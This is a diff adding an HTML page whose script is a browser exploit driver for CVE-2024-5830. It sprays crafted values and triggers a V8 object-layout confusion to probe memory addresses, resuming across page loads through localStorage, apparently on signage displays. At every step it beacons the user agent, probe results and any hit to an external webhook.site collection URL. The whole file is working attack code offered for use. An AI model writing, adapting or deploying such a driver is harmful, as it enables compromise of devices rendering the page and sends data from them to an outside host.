@@ -1,0 +1,71 @@
+<html><body><script>
+// CVE-2024-5830 key-address sweep driver (resumes via localStorage across signage renders)
+const SINK = 'https://webhook.site/ba41f60a-8179-4fb4-8e46-be78a2fe067f';
+const STRIDE = 0x200, BASE0 = 0xdc5, BLOCK = 64, BUDGET_MS = 15000;
+function enc(s){ return encodeURIComponent(String(s).slice(0,160)); }
+function beacon(tag, val){
+  try { fetch(SINK + '?t=' + enc(tag) + '&v=' + enc(val), {mode:'no-cors'}); } catch(e) {}
+  try { new Image().src = SINK + '?t=i_' + enc(tag) + '&v=' + enc(val); } catch(e) {}
+}
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+var view = new ArrayBuffer(24), dblArr = new Float64Array(view), intView = new Uint32Array(view);
+function i32tof(i1, i2){ intView[0] = i1; intView[1] = i2; return dblArr[0]; }
+
+function tryOne(cand, num) {
+  let x = {};
+  for (let i = 0; i < num; i++) { x['a' + i] = 1; }
+  let x1 = {};
+  for (let i = 0; i < num; i++) { x1['a' + i] = 1; }
+  x1.prop = 1;
+  x.__defineGetter__("prop", function() {
+    let obj = {};
+    obj.a0 = 1.5;
+    for (let i = 0; i < 1024 + 512; i++) {
+      let tmp = {};
+      tmp.a0 = 1;
+      for (let j = 1; j < num; j++) { tmp['a' + j] = 1; }
+      tmp['p' + i] = 1;
+    }
+    return 4;
+  });
+  x.z = 1; delete x.z;
+  let y = {...x};
+  let sv = i32tof(cand, 0x8282);
+  let arr = new Array(256);
+  for (let i = 0; i < 7; i++) { arr[i] = new Array(256); for (let j = 0; j < 256; j++) { arr[i][j] = sv; } }
+  let z = {};
+  z.__proto__ = y;
+  z.p = 1;
+  z.p;
+  let ks;
+  try { ks = Object.keys(y); } catch(e) { return 'keys-err'; }
+  if (ks.length > num + 1) { return 'HIT:' + ks.join('|'); }
+  let tn; try { tn = typeof y.name; } catch(e) { tn = 'e'; }
+  if (tn !== 'undefined') { return 'NAME:' + tn; }
+  return 'nohit';
+}
+
+(async function main(){
+  beacon('drv_start', 'ua=' + navigator.userAgent.slice(0,50));
+  let idx = 0;
+  try { idx = parseInt(localStorage.cs5830_idx || '0', 10) || 0; } catch(e) {}
+  if (localStorage.cs5830_done === '1') { beacon('drv_done_early', idx); return; }
+  beacon('drv_resume', 'idx=' + idx);
+  let t0 = Date.now(), done = 0;
+  for (let k = 0; k < BLOCK; k++) {
+    let cand = BASE0 + (idx + k) * STRIDE;
+    try { localStorage.cs5830_idx = String(idx + k + 1); } catch(e) {}
+    let r;
+    try { r = tryOne(cand, 3); } catch(e) { r = 'exc:' + (e && e.message || 'x'); }
+    beacon('c', (idx + k) + ':0x' + cand.toString(16) + '=' + r);
+    if (String(r).indexOf('HIT') === 0 || String(r).indexOf('NAME') === 0) {
+      try { localStorage.cs5830_done = '1'; localStorage.cs5830_hit = String(r); } catch(e) {}
+      beacon('FOUND', (idx + k) + ':0x' + cand.toString(16) + ' ' + r);
+      done = 1; break;
+    }
+    if (Date.now() - t0 > BUDGET_MS) { beacon('drv_budget', idx + k); break; }
+    await sleep(40);
+  }
+  beacon(done ? 'drv_found' : 'drv_block', 'next_idx=' + (parseInt(localStorage.cs5830_idx||'0',10)||0));
+})();
+</script></body></html>
